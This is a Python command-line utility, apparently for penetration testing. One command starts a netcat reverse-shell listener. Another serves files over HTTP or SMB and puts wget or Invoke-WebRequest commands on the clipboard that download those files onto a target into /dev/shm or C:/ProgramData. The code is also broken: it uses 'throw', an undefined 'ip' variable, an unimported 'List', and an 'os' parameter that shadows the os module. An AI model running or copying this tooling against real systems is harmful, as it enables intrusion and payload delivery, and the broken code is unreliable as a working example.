import subprocess
import click
import pyperclip
import os

from src.utils.command_wrapper import command_wrapper

@click.group()
def utils():
    pass

@utils.command()
@click.argument('port', default=80, required=True)
def listen(port):
    try:
        port = int(port)
        if port < 1 or port > 65535:
            raise ValueError
        res = command_wrapper(["rlwrap", "nc", "-lvnp", str(port)])
    except ValueError:
        click.echo("Invalid port number")
        return
    except FileNotFoundError:
        click.echo("nc not found. Please install netcat.")
        return
    except Exception as e:
        click.echo(f"An error occurred: {e}")
        return



@utils.command()
@click.option('--os', type=click.Choice(['linux', 'windows'], case_sensitive=False), default='linux', required=True)
@click.option('--port', default=80, required=True, type=int)
@click.option('--auto-host', is_flag=True, default=True, type=bool)
@click.option('--via', type=click.Choice(['http', 'smb'], case_sensitive=False), default="http", required=True)
@click.option('--host-ip', type=str, default="123.123.123.123", required=True)
@click.option('--output-path', type=str, required=False)
@click.argument('files', required=True, nargs=-1, type=click.Path())
def ship(os: str, port: int, auto_host: bool, via: str, host_ip: str, output_path: str, files: List[str]):

    cmd = ''
    output_path = output_path if output_path else ('/dev/shm/' if os == 'linux' else 'C:/ProgramData/')
    
    os.system("mkdir -p share")
    for file in files:
        os.system(f"cp --update=none {file} share/")
        match os:
            case "linux":
                match via:
                    case "http":
                        cmd += f"wget {ip}:{port}/{file} -O {output_path}{file}\n"
                    case "smb":
                        throw NotImplementedError("SMB not implemented for linux")
            case "windows":
                match via:
                    case "http":
                        cmd += f"\"Invoke-WebRequest\" -Uri http://{host_ip}:{port}/{file} -OutFile {output_path}{file}\n"
                    case "smb":
                        cmd = f"copy \\\\{host_ip}\\share\\{file} {output_path}{file}\n"
        
    pyperclip.copy(cmd)

    if auto_host:
        match via:
            case "http":
                res = command_wrapper(["python3", "-m", "http.server", str(port), "--directory", "share"])
            case "smb":
                res = command_wrapper(["smbserver.py", "share", "share"])

if __name__ == "__main__":
    utils()
